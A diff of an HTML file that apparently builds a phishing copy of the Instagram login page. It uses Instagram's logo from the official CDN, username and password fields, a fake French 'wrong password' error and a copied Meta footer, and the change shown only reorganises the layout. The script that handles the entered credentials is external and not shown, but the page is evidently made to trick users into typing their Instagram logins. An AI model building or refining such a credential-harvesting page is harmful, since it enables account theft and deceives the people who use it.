@@ -8,52 +8,56 @@
 </head>
 <body>
 
-    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-        style="pointer-events: none; width: 100%; margin-top: 70px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center; display: flex;">
-        <img data-bloks-name="bk.components.Image" role="heading" alt="Instagram from Meta" class="wbloks_1"
-            src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp"
-            style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
-    </div>
+    <main style="flex: 1; display: flex; flex-direction: column; align-items: center;">
 
-    <div class="text">Log into instagram</div>
-
-    <div data-bloks-name="bk.components.Flexbox" class="bloc1">
-        <div class="input-container">
-            <input type="text" id="username" class="input-field" placeholder=" " autocomplete="off">
-            <label for="username" class="input-label">Username, email or mobile number</label>
+        <div class="wbloks_1" style="pointer-events: none; width: 100%; margin-top: 70px; margin-bottom: 20px; align-items: center; justify-content: center; display: flex;">
+            <img role="heading" alt="Instagram from Meta" class="wbloks_1"
+                src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp"
+                style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
         </div>
-    </div>
 
-    <div data-bloks-name="bk.components.Flexbox" class="bloc1">
-        <div class="input-container">
-            <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password">
-            <label for="password" class="input-label">Password</label>
+        <div class="text">Log into instagram</div>
+
+        <div class="bloc1">
+            <div class="input-container">
+                <input type="text" id="username" class="input-field" placeholder=" " autocomplete="off">
+                <label for="username" class="input-label">Username, email or mobile number</label>
+            </div>
         </div>
-    </div>
 
-    <div id="error-message" class="error-text" style="display: none;">Mot de passe erroné</div>
+        <div class="bloc1">
+            <div class="input-container">
+                <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password">
+                <label for="password" class="input-label">Password</label>
+            </div>
+        </div>
 
-    <button class="btn-login" id="login-btn">Log in</button>
+        <div id="error-message" class="error-text" style="display: none;">Mot de passe erroné</div>
+
+        <button class="btn-login" id="login-btn">Log in</button>
+
+    </main>
+
+    <footer style="border-top: 1px solid #dbdbdb; padding: 2rem 1rem 1.5rem; text-align: center;">
+        <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 4px 12px; margin-bottom: 1rem;">
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">À propos</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Blog</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Emplois</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Aide</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">API</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Confidentialité</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Conditions</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Lieux</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Instagram Lite</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Threads</a>
+            <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Meta Verified</a>
+        </div>
+        <div style="display: inline-flex; align-items: center; gap: 6px; margin-bottom: 0.75rem; font-size: 12px; color: #737373; border: 1px solid #dbdbdb; padding: 4px 10px; border-radius: 6px;">
+            🌐 Français ▾
+        </div>
+        <div style="font-size: 11px; color: #737373;">© 2026 Instagram from Meta</div>
+    </footer>
 
     <script src="script.js"></script>
-    <footer style="margin-top: auto; border-top: 1px solid #dbdbdb; padding: 2rem 1rem 1.5rem; text-align: center;">
-  <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 4px 12px; margin-bottom: 1rem;">
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">À propos</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Blog</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Emplois</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Aide</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">API</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Confidentialité</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Conditions</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Lieux</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Instagram Lite</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Threads</a>
-    <a href="#" style="color: #737373; text-decoration: none; font-size: 12px;">Meta Verified</a>
-  </div>
-  <div style="display: inline-flex; align-items: center; gap: 6px; margin-bottom: 0.75rem; font-size: 12px; color: #737373; border: 1px solid #dbdbdb; padding: 4px 10px; border-radius: 6px;">
-    🌐 Français ▾
-  </div>
-  <div style="font-size: 11px; color: #737373;">© 2026 Instagram from Meta</div>
-</footer>
 </body>
 </html>
